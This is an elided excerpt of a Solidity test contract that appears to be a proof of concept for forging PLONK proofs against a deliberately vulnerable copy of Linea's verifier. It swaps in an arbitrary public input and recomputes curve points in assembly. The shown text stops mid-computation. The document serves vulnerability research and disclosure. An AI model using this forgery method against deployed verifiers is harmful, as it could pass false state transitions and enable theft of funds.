...
contract LastChallengeAttack is Test {
    ...
    function setUp() public {
        ...
        // Valid proof from which some elements will be replaced. This proof was taken from [Linea's test suite](https://github.com/Consensys/linea-contracts-fix/blob/2056d470143f66196184fd55b27f1240d5f74ef9/test/testData/Full/output-file.json#L2).
        ...
        // Public input. This public input was taken from [Linea's test suite](https://github.com/Consensys/linea-contracts-fix/blob/2056d470143f66196184fd55b27f1240d5f74ef9/test/testData/Full/output-file.json#L306).
    ...
    function test_VerifyValidProof() external returns (bool) {
     ...
     function test_ForgeProof() external returns (bool) {
        // We forge a proof for the following arbitrary input: 
        uint256 arbitraryInput = uint256(bytes32(keccak256(abi.encodePacked("RANDOM_INPUT_SELECTED_BY_THE_PROVER")))) % r_mod;
        
        console2.log("Changing the public input from %s to %s", uint256(bytes32(stateTransitionHash)), arbitraryInput);
        uint256[] memory public_inputs = new uint256[](1);
        public_inputs[0] = arbitraryInput; // Adding our arbitrary public input to the input array.

        // When changing the public input as done above, we also need to recompute some elements
        // of the proof (e.g. commitments). Which elements should be changed are commented below. 
        // To change them after modifying the public input, uncomment the associated lines in `VulnerablePlonkVerifier.sol`.
        // Then run `forge test --match-test test_ForgeProof -vvv`, which is going to revert with a custom error. 
        // The elements should be changed to their associated value returned in the custom error. The error is effectively
        // used as a way to "print" elements from assembly code, as it doesn't support `console.log` or other logging functions.

        // A and B are constant elliptic curve points respecting e(-A, [x]2) * e(B, [1]2) == 1. 
        // They can for example be extracted by using a custom error at the end of `VulnerablePlonkVerifier.sol` to extract the 
        // curve points, and running the test for a valid proof. They are called `folded_digests` and `folded_quotients` lines 786-793.
        ...
        // They are computed later as `X = [Wz]1 = (-u)*Y + A` and `Y = [Wzω]1 = 1/(zu(ω - 1)) * (C + B -zA)`.
        {
            ...
            assembly {
                ...
                mstore(add(mPtr, 0x60), A_y)
                l_success := staticcall(gas(), 6, mPtr, 0x80, mPtr, 0x40) // Stores X = A - uy (x, y) coordinates to mPtr
                if iszero(l_success) {
                    revert(0,0)
                }
